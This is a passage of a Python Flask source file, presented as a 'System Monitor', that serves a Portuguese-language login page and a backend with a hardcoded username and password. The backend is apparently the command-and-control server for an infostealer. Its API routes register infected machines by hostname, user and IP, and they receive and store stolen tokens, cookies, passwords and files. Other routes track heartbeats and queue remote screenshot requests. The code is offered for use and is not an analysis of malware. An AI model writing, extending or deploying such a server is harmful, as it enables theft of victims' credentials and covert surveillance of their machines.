        
        <div class="error" id="errorMsg"></div>
        <div class="success" id="successMsg"></div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Usuário</label>
                <input type="text" id="username" name="username" placeholder="Digite seu usuário" required>
                <div class="input-glow"></div>
                <div class="typing-indicator" id="usernameTyping">
                    <span></span><span></span><span></span>
                </div>
            </div>
            
            <div class="form-group">
                <label for="password">Senha</label>
                <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
                <div class="input-glow"></div>
                <div class="typing-indicator" id="passwordTyping">
                    <span></span><span></span><span></span>
                </div>
            </div>
            
            <button type="submit" class="login-btn" id="loginBtn">
                <span id="btnText">ENTRAR</span>
            </button>
        </form>
        
        <div class="message">
            <p>Se você chegou até aqui, tem um longo caminho a seguir...</p>
        </div>
    </div>

    <script>
        // Criar partículas mínimas
        function createMinimalParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 20;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                const size = Math.random() > 0.7 ? 'large' : Math.random() > 0.4 ? 'medium' : 'small';
                particle.className = `particle ${size}`;
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 40 + 's';
                particle.style.animationDuration = (30 + Math.random() * 20) + 's';
                particlesContainer.appendChild(particle);
            }
        }
        
        // Prevenir seleção de texto
        function preventSelection() {
            document.addEventListener('selectstart', function(e) {
                if (!e.target.matches('input, input *')) {
                    e.preventDefault();
                }
            });
            
            document.addEventListener('dragstart', function(e) {
                e.preventDefault();
            });
            
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
        }
        
        // Inicializar
        createMinimalParticles();
        preventSelection();
        
        // Elementos do formulário
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const btnText = document.getElementById('btnText');
        const errorMsg = document.getElementById('errorMsg');
        const successMsg = document.getElementById('successMsg');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        
        // Envio do formulário simplificado
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            // Resetar mensagens
            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';
            
            // Estado de loading
            loginBtn.classList.add('loading');
            btnText.textContent = 'VERIFICANDO...';
            loginBtn.disabled = true;
            
            try {
                // Fazer requisição real para API
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Sucesso
                    successMsg.textContent = '✓ Acesso concedido! Redirecionando...';
                    successMsg.style.display = 'block';
                    
                    loginBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
                    btnText.textContent = 'ACESSO LIBERADO';
                    
                    // Redirecionar após 2 segundos
                    setTimeout(() => {
                        window.location.href = result.redirect || '/dashboard';
                    }, 2000);
                } else {
                    // Erro
                    errorMsg.textContent = '✗ ' + (result.error || 'Credenciais inválidas! Tente novamente.');
                    errorMsg.style.display = 'block';
                    
                    loginBtn.classList.remove('loading');
                    btnText.textContent = 'TENTAR NOVAMENTE';
                    loginBtn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
                    
                    setTimeout(() => {
                        loginBtn.style.background = 'linear-gradient(135deg, #4c1d95, #6b21a8, #7c3aed)';
                        btnText.textContent = 'ENTRAR';
                        loginBtn.disabled = false;
                    }, 2000);
                    
                    // Limpar senha e focar
                    passwordInput.value = '';
                    passwordInput.focus();
                }
            } catch (error) {
                // Erro de conexão
                errorMsg.textContent = '✗ Erro de conexão! Tente novamente.';
                errorMsg.style.display = 'block';
                
                loginBtn.classList.remove('loading');
                btnText.textContent = 'TENTAR NOVAMENTE';
                loginBtn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
                
                setTimeout(() => {
                    loginBtn.style.background = 'linear-gradient(135deg, #4c1d95, #6b21a8, #7c3aed)';
                    btnText.textContent = 'ENTRAR';
                    loginBtn.disabled = false;
                }, 2000);
            }
        });
    </script>
</body>
</html>
"""

# API Endpoints robustos
@app.route('/')
def index():
    """Página de login (principal)"""
    return LOGIN_TEMPLATE

@app.route('/login', methods=['POST'])
def login():
    """Processa login"""
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if username == 'lealdade' and password == 'lealdade':
        session['logged_in'] = True
        session['username'] = username
        session.permanent = True
        return jsonify({'success': True, 'redirect': '/dashboard'})
    else:
        return jsonify({'success': False, 'error': 'Credenciais inválidas'}), 401

@app.route('/logout')
def logout():
    """Logout"""
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
@require_login
def dashboard():
    """Página principal do painel"""
    return HTML_TEMPLATE.replace('{{UPDATE_TIME}}', datetime.now().strftime('%H:%M:%S'))

@app.route('/api/register', methods=['POST'])
@require_login
def register_endpoint():
    """Registra novo endpoint"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'status': 'online',
            'last_seen': datetime.now().isoformat(),
            'registered_at': datetime.now().isoformat()
        }
        
        print(f"[API] Endpoint registrado: {endpoint_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao registrar endpoint: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens_data')
@require_login
def get_tokens_data():
    """Retorna todos os tokens coletados"""
    return jsonify(endpoint_tokens)

@app.route('/api/cookies_data')
@require_login
def get_cookies_data():
    """Retorna todos os cookies coletados"""
    return jsonify(endpoint_cookies)

@app.route('/api/passwords_data')
@require_login
def get_passwords_data():
    """Retorna todas as senhas coletadas"""
    return jsonify(endpoint_passwords)

@app.route('/api/files_data')
@require_login
def get_files_data():
    """Retorna todos os arquivos recebidos"""
    return jsonify(endpoint_files)

@app.route('/api/metrics_data')
@require_login
def get_metrics_data():
    """Retorna todas as métricas"""
    return jsonify(metrics_data)

@app.route('/api/tokens', methods=['POST'])
@require_login
def receive_tokens():
    """Recebe tokens de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        tokens = data.get('tokens', [])
        
        if endpoint_id:
            endpoint_tokens[endpoint_id] = {
                'tokens': tokens,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Tokens recebidos: {endpoint_id} - {len(tokens)} tokens")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber tokens: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/cookies', methods=['POST'])
@require_login
def receive_cookies():
    """Recebe cookies de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        cookies = data.get('cookies', [])
        
        if endpoint_id:
            endpoint_cookies[endpoint_id] = {
                'cookies': cookies,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Cookies recebidos: {endpoint_id} - {len(cookies)} cookies")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber cookies: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/passwords', methods=['POST'])
@require_login
def receive_passwords():
    """Recebe senhas de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        passwords = data.get('passwords', [])
        
        if endpoint_id:
            endpoint_passwords[endpoint_id] = {
                'passwords': passwords,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Senhas recebidas: {endpoint_id} - {len(passwords)} senhas")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber senhas: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/files', methods=['POST'])
@require_login
def receive_files():
    """Recebe arquivos de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        files = data.get('files', [])
        
        if endpoint_id:
            endpoint_files[endpoint_id] = {
                'files': files,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Arquivos recebidos: {endpoint_id} - {len(files)} arquivos")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber arquivos: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST'])
def receive_metrics():
    """Recebe métricas de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', {})
        
        if endpoint_id:
            metrics_data.append({
                'endpoint_id': endpoint_id,
                'metrics': metrics,
                'timestamp': datetime.now().isoformat()
            })
            print(f"[API] Métricas recebidas: {endpoint_id}")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber métricas: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
def request_screenshot(endpoint_id):
    """Solicita screenshot de um endpoint específico"""
    try:
        if endpoint_id not in screenshot_requests:
            screenshot_requests[endpoint_id] = {
                'request_screenshot': True,
                'timestamp': datetime.now().isoformat()
            }
        print(f"[API] Screenshot solicitado: {endpoint_id}")
        return jsonify({'status': 'success', 'message': f'Screenshot solicitado para {endpoint_id}'})
    except Exception as e:
        print(f"[API] Erro ao solicitar screenshot: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>')
def check_screenshot_request(endpoint_id):
    """Verifica se há solicitação de screenshot"""
    if endpoint_id in screenshot_requests:
        return jsonify(screenshot_requests[endpoint_id])
    else:
        return jsonify({'request_screenshot': False})

@app.route('/api/screenshots')
def get_screenshots():
    """Retorna todos os screenshots"""
    return jsonify(endpoint_screenshots)

@app.route('/api/heartbeat', methods=['POST'])
def receive_heartbeat():
    """Recebe heartbeat de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        status = data.get('status', 'unknown')
        
        if endpoint_id in endpoints:
            endpoints[endpoint_id]['last_seen'] = datetime.now().isoformat()
            endpoints[endpoint_id]['status'] = status
        
        print(f"[API] Heartbeat recebido: {endpoint_id} - {status}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber heartbeat: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/endpoints')
def list_endpoints():
    """Lista todos os endpoints"""
    try:
        endpoints_list = []
        for ep_id, data in endpoints.items():
            endpoints_list.append({
                'id': ep_id,
                'status': data.get('status', 'unknown'),
                'last_seen': data.get('last_seen', ''),
                'hostname': data.get('hostname', ''),
                'user': data.get('user', ''),
                'ip_address': data.get('ip_address', ''),
                'external_ip': data.get('external_ip', ''),
                'platform': data.get('platform', ''),
                'ram': data.get('ram', ''),
                'registered_at': data.get('registered_at', '')
            })
        
        return jsonify(endpoints_list)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print("🚀 Iniciando System Monitor CORRIGIDO para Railway...")
    print("📡 Servidor robusto sem dependências problemáticas")
    print("🌐 URL: https://web-production-49d37.up.railway.app")
    print()
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
